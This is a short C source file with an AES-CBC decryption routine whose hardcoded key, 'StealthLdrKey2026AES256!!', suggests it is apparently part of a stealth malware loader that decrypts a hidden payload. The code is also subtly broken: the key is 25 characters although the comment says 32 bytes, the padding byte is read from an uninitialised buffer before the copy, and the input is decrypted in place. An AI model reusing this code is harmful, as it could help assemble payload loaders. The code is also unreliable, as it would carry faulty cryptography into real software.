#include "aes.h"
#include <stdio.h>
#include <stdlib.h>

PBYTE AES_Decrypt(PBYTE encrypted, SIZE_T encSize, SIZE_T* outSize) {
    if (encSize < 16) return NULL;

    unsigned char key[] = "StealthLdrKey2026AES256!!";  // 32 bytes
    unsigned char iv[16];
    memcpy(iv, encrypted, 16);

    *outSize = encSize - 16;
    PBYTE plaintext = (PBYTE)malloc(*outSize);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, encrypted + 16, *outSize);

    // Remove padding (simplificado)
    *outSize -= plaintext[*outSize - 1];  // PKCS7

    memcpy(plaintext, encrypted + 16, *outSize);
    return plaintext;
}